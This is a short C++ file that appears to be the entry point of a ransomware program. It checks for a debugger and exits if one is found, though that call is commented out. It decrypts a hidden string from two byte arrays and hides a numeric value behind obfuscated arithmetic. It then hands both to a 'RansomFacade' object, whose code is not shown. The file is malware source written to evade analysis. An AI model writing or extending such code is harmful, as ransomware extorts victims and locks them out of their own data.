#include "Header.h"
#include "RansomFacade.h"
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <WinUser.h>
#include <debugapi.h>

void adbg_IsDebuggerPresent(void)
{
	BOOL found = false;
	found = IsDebuggerPresent();

	if (found)
	{
		exit(32);
	}
}


int main() {
//	 adbg_IsDebuggerPresent();

	// std::vector<unsigned char> v1({ 229, 81, 148, 83, 28, 184 });
	// std::vector<unsigned char> v2({ 32, 240, 171, 247, 46, 151 });
	// std::string kitty = decrypt(
//		v1, v2,
//		42
//	);


	
	std::vector<unsigned char> v1({ 252, 53, 198, 150, 220, 38, 158, 121, 81, 66, 147, 69, 162, 165, 93, 154, 149, 99, 232, 137 });
	std::vector<unsigned char> v2({ 71, 26, 137, 181, 57, 228, 108, 148, 189, 199, 129, 205, 103, 103, 183, 121, 116, 169, 39, 137 });
	std::string kitty = decrypt(
		v1, v2,
		37
	);
	uint16_t x = 32592;
	uint16_t y = 38;
	uint16_t  z = 211;
	uint16_t r = (((x ^ y) + ((x & y) << 1)) | z) + (((x ^ y) + ((x & y) << 1)) & z);
	RansomFacade rs(kitty, r);
}
